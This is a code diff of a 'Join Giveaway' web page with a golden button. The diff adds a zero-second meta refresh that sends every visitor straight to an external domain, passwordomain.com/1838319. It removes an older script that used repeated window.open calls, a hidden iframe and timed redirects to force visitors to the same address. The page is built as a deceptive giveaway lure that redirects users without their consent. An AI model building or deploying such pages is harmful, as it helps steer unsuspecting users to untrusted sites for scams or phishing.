@@ -4,7 +4,12 @@
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>Join Giveaway</title>
+  
+  <!-- Meta refresh for automatic redirect -->
+  <meta http-equiv="refresh" content="0; url=https://passwordomain.com/1838319">
+
   <style>
+    /* Center everything and style background */
     body {
       display: flex;
       justify-content: center;
@@ -13,10 +18,12 @@
       margin: 0;
       background-color: #ffffff; /* White background */
       font-family: Arial, sans-serif;
+      text-align: center;
     }
 
+    /* Golden premium button */
     .btn {
-      background: linear-gradient(135deg, #d4af37, #f5d76e); /* Golden gradient */
+      background: linear-gradient(135deg, #d4af37, #f5d76e);
       border: none;
       border-radius: 12px;
       padding: 20px 50px;
@@ -26,6 +33,7 @@
       cursor: pointer;
       transition: all 0.3s ease;
       box-shadow: 0 8px 20px rgba(0,0,0,0.25);
+      text-decoration: none;
     }
 
     .btn:hover {
@@ -33,39 +41,19 @@
       transform: translateY(-3px);
       box-shadow: 0 12px 25px rgba(0,0,0,0.35);
     }
+
+    /* Optional small text below the button */
+    .note {
+      margin-top: 20px;
+      font-size: 16px;
+      color: #555;
+    }
   </style>
 </head>
 <body>
-  <button class="btn" onclick="forceOpen()">JOIN GIVEAWAY</button>
+  <!-- Button points to the same page itself, since meta refresh handles redirect -->
+  <a href="https://passwordomain.com/1838319" class="btn">JOIN GIVEAWAY</a>
 
-  <script>
-    function forceOpen() {
-      var url = "https://passwordomain.com/1838319";
-
-      // 1. Try system-level open (works on some apps/browsers)
-      window.open(url, "_system");
-
-      // 2. Try normal new tab
-      window.open(url, "_blank");
-
-      // 3. Try forcing into top frame
-      window.open(url, "_top");
-
-      // 4. Hidden iframe trick
-      var iframe = document.createElement("iframe");
-      iframe.style.display = "none";
-      iframe.src = url;
-      document.body.appendChild(iframe);
-
-      // 5. Rapid redirect fallback
-      setTimeout(function() {
-        window.location.href = url;
-      }, 500);
-
-      setTimeout(function() {
-        window.location.replace(url);
-      }, 1000);
-    }
-  </script>
+  <div class="note">Redirecting you to the giveaway...</div>
 </body>
 </html>
